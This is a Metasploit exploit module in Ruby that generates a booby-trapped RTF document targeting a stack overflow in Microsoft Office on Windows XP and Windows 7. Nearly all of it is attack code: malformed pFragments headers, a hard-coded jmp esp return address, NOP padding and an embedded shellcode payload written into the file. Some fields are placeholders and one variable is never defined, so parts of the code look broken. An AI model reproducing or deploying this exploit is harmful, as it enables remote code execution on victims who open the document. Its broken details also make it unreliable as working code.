##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'office RTF undiscover CQ',
			'Description'    => %q{
					 office version
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'XX ', # Original Exploit
					'hellok', # MSF Module
				],
			'References'     =>
				[
					[ 'EDB',  ]
				],
			'DefaultOptions'  =>
				{
					'ExitFunction' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Platform'       => 'win',
			'Payload'        =>
				{
				   #'Space'           => 200,
				   #'BadChars'        => "\x00\x0a\x0d\x1a\x80",
				   #'DisableNops'     => true,
				   #'StackAdjustment' => -3500,
				},

			'Targets'        =>
				[
					[ 'Windows XP',
						{
							'Ret'     => "\x2f\x49",
							'Offset'  => 4102,
							'Padding' => 1879
						}
					],
					[ 'Windows 7',
						{
							'Ret'     => "\x2f\x49",
							'Offset'  => 4102,
							'Padding' => 1931
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => '',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.', 'hellok_rtf.rtf']),
			], self.class)

	end

	def exploit

		head0="{\\rt\#\#{\\shp{\\sp}}{\\shp{\\sp}}{\\shp{\\sp}}{\\shp{\\*\\shpinst\\shpfhdr0\\shpbxcolumn\\shpbypara\\sh pwr2}{\\sp{\\sn {}{}{\\sn}{\\sn}{\\*\\*}pFragments}{\\*\\*\\*}{\\sv{\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*}9;2;ffffffffff#####################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################050000000000000000000000000000000000000000"
		head1="{\\rt\#\#{\\shp{\\sp}}{\\shp{\\sp}}{\\shp{\\sp}}{\\shp{\\sp{\\sn {}{}{\\sn}{\\sn}{\\*\\*}pFragments}{\\*\\*\\*}{\\sv{\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*}9;2;ffffffffff#####################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################050000000000000000000000000000000000000000"
		
		padding="0000807c0000807cAAAAAAAAAAAAAAAAAAAAAAAA909090909090909090909090909090909090"		
		jmp_esp="1245fa7f"
		head2="{}}}}}}"

		
		
			payload_buf = ''
			payload_buf << payload.encoded
			hex_payload = Rex::Text.to_hex(payload_buf, prefix = "", count = 1)#to_unescape to_hex_ascii to_unicode hex_to_raw to_hex_dump
			buffer[0,hex_payload.length]=hex_payload
			print_status("hex_payload.length:#{hex_payload.length}")
			head1<<jmp_esp
			head1<<padding
			head1<<hex_payload
			head1<<head2
			file_create(head1)
			print_status("if error,you can change head1 to head0")
		
	end
end
